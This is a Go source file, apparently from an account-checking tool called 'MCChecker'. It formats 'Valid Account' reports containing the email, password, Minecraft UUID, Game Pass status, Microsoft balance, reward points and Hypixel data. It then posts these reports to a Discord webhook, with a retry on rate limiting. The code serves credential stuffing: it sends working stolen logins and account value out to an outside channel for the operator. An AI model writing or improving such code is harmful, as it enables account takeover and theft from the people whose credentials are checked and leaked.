package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

type WebhookEmbed struct {
	Title       string         `json:"title,omitempty"`
	Description string         `json:"description,omitempty"`
	Color       int            `json:"color,omitempty"`
	Fields      []WebhookField `json:"fields,omitempty"`
	Footer      *WebhookFooter `json:"footer,omitempty"`
	Thumbnail   *WebhookImage  `json:"thumbnail,omitempty"`
	Timestamp   string         `json:"timestamp,omitempty"`
}

type WebhookField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type WebhookFooter struct {
	Text    string `json:"text"`
	IconURL string `json:"icon_url,omitempty"`
}

type WebhookImage struct {
	URL string `json:"url"`
}

type WebhookPayload struct {
	Username  string         `json:"username,omitempty"`
	AvatarURL string         `json:"avatar_url,omitempty"`
	Content   string         `json:"content,omitempty"`
	Embeds    []WebhookEmbed `json:"embeds"`
}

func buildWebhookEmbed(title, description string, color int) WebhookEmbed {
	return WebhookEmbed{
		Title:       title,
		Description: description,
		Color:       color,
		Footer: &WebhookFooter{
			Text: Version,
		},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

func buildAccountWebhookEmbed(email, password, username, uuid,
	gamepass, msBalance, rewardPoints, hypixelInfo string) WebhookEmbed {

	var fields []WebhookField

	fields = append(fields, WebhookField{Name: "Email", Value: fmt.Sprintf("||%s||", email), Inline: true})
	fields = append(fields, WebhookField{Name: "Password", Value: fmt.Sprintf("||%s||", password), Inline: true})
	fields = append(fields, WebhookField{Name: "Username", Value: username, Inline: true})

	if uuid != "" {
		fields = append(fields, WebhookField{Name: "UUID", Value: uuid, Inline: true})
	}

	if gamepass != "" && gamepass != "No License" {
		fields = append(fields, WebhookField{Name: "Game Pass", Value: gamepass, Inline: true})
	}

	if msBalance != "" {
		fields = append(fields, WebhookField{Name: "MS Balance", Value: msBalance, Inline: true})
	}

	if rewardPoints != "" {
		fields = append(fields, WebhookField{Name: "Reward Points", Value: rewardPoints, Inline: true})
	}

	if hypixelInfo != "" {
		fields = append(fields, WebhookField{Name: "Hypixel", Value: hypixelInfo, Inline: false})
	}

	color := 0x5865F2
	if strings.Contains(gamepass, "GamePass") || strings.Contains(gamepass, "Java") {
		color = 0x00FF00
	}

	thumbURL := fmt.Sprintf("https://crafatar.com/avatars/%s?overlay", uuid)
	if uuid == "" {
		thumbURL = "https://cdn.discordapp.com/attachments/1331822684136538175/1452257682386845726/ChatGPT_Image_Dec_21_2025_12_42_26_AM.png"
	}

	return WebhookEmbed{
		Title:  fmt.Sprintf("Valid Account - %s", username),
		Color:  color,
		Fields: fields,
		Footer: &WebhookFooter{
			Text: Version,
		},
		Thumbnail: &WebhookImage{URL: thumbURL},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

func sendWebhook(webhookURL string, embed WebhookEmbed) {
	if webhookURL == "" {
		return
	}

	payload := WebhookPayload{
		Username:  "MCChecker",
		AvatarURL: "https://cdn.discordapp.com/attachments/1331822684136538175/1452257709436043442/Xbox_Codes_fetched_by_ShulkerV2.png",
		Embeds:    []WebhookEmbed{embed},
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return
	}

	req, err := http.NewRequest("POST", webhookURL, bytes.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", UserAgent)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		time.Sleep(2 * time.Second)
		retryReq, _ := http.NewRequest("POST", webhookURL, bytes.NewReader(data))
		retryReq.Header.Set("Content-Type", "application/json")
		retryReq.Header.Set("User-Agent", UserAgent)
		client.Do(retryReq)
	}
}
